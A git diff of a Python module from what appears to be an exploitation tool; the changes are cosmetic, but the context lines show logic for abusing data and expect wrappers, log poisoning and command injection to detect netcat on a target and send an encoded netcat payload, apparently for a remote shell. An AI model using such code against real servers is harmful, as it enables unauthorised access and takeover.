@@ -1,4 +1,4 @@
-from src.httpreqs.post import POST
+"""nc payload"""
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
@@ -40,6 +40,7 @@ def exploit_nc(exploit, method, ip, port):
                 "",
             )
             return True
+
     if method == "DATA":
         if args.mode == "post":
             res, _ = request.REQUEST(
@@ -59,6 +60,7 @@ def exploit_nc(exploit, method, ip, port):
                 "",
                 "",
             )
+
         if "/bin" in res.text and "/nc" in res.text:
             printInfo(ip, port, "nc", "data wrapper")
             if args.mode == "post":
@@ -80,6 +82,7 @@ def exploit_nc(exploit, method, ip, port):
                     "",
                 )
             return True
+
     if method == "EXPECT":
         if args.mode == "post":
             res, _ = request.REQUEST(
@@ -99,6 +102,7 @@ def exploit_nc(exploit, method, ip, port):
                 "",
                 "",
             )
+
         if "/bin" in res.text and "/nc" in res.text:
             printInfo(ip, port, "nc", "expect wrapper")
             if args.mode == "post":
@@ -120,6 +124,7 @@ def exploit_nc(exploit, method, ip, port):
                     "",
                 )
             return True
+
     if method == "TRUNC":
         exploit_log_poison(
             ip, port, url, encode(ncPayload), "", ncTest, "/nc", exploit["POSTVAL"]
@@ -145,6 +150,7 @@ def exploit_nc(exploit, method, ip, port):
                 "",
                 "",
             )
+
         if "/bin" in res.text and "/nc" in res.text:
             printInfo(ip, port, "nc", "command injection")
             if args.mode == "post":
